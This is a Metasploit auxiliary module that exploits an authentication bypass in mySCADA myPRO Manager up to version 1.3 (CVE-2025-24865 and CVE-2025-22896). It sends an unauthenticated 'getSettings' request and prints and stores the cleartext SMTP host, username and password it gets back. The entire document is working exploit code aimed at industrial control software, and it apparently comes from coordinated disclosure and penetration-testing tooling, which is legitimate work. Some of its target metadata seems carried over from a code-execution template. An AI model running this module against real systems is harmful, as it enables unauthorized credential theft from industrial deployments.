class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck
  CheckCode = Exploit::CheckCode

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'mySCADA myPRO Manager Credential Harvester (CVE-2025-24865 and CVE-2025-22896)',
        'Description' => %q{
          Credential Harvester in MyPRO Manager <= v1.3 from mySCADA.
          The product suffers from a broken authentication vulnerability (CVE-2025-24865) for certain functions. One of them is the configuration page for notifications, which returns the cleartext credentials (CVE-2025-22896) before correctly veryfing that the associated request is coming from an authenticated and authorized entity.
        },
        'License' => MSF_LICENSE,
        'Author' => ['Michael Heinzl'], # Vulnerability discovery & MSF module
        'References' => [
          [ 'URL', 'https://www.cisa.gov/news-events/ics-advisories/icsa-25-044-16'],
          [ 'CVE', '2025-24865'],
          [ 'CVE', '2025-22896']
        ],
        'DisclosureDate' => '2025-02-13',
        'DefaultOptions' => {
          'RPORT' => 34022,
          'SSL' => false
        },
        'Platform' => 'win',
        'Arch' => [ ARCH_CMD ],
        'Targets' => [
          [
            'Windows_Fetch',
            {
              'Arch' => [ ARCH_CMD ],
              'Platform' => 'win',
              'DefaultOptions' => { 'FETCH_COMMAND' => 'CURL' },
              'Type' => :win_fetch
            }
          ]
        ],
        'DefaultTarget' => 0,

        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new(
          'TARGETURI',
          [ true, 'The URI for the MyPRO Manager web interface', '/' ]
        )
      ]
    )
  end

  def check
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'assets/index-DBkpc6FO.js')
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      return CheckCode::Unknown
    end

    if res.to_s =~ /const S="([^"]+)"/
      version = ::Regexp.last_match(1)
      vprint_status('Version retrieved: ' + version)
      if Rex::Version.new(version) <= Rex::Version.new('1.3')
        return CheckCode::Appears
      end

      return CheckCode::Safe
    end
    return CheckCode::Unknown
  end

  def run
    post_data = {
      'command' => 'getSettings'
    }

    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/json',
      'data' => JSON.generate(post_data),
      'uri' => normalize_uri(target_uri.path, 'get')
    })

    fail_with(Failure::Unknown, 'No response from server.') if res.nil?
    fail_with(Failure::UnexpectedReply, 'Non-200 returned from server.') if res.code != 200
    print_good('Mail server credentials retrieved:')
    data = res.get_json_document

    if data.key?('smtp') && data['smtp'].is_a?(Hash)
      smtp_info = data['smtp']

      host = smtp_info.fetch('host', 'Unknown Host')
      port = smtp_info.fetch('port', 'Unknown Port')
      auth = smtp_info.fetch('auth', 'Unknown Auth')
      user = smtp_info.fetch('user', 'Unknown User')
      passw = smtp_info.fetch('pass', 'Unknown Password')

      print_good("Host: #{host}")
      print_good("Port: #{port}")
      print_good("Auth Type: #{auth}")
      print_good("User: #{user}")
      print_good("Password: #{passw}")

      unless user == 'Unknown User' || passw == 'Unknown Password'
        store_valid_credential(user: user, private: passw, proof: data.to_s)
      end
    end
  end

end
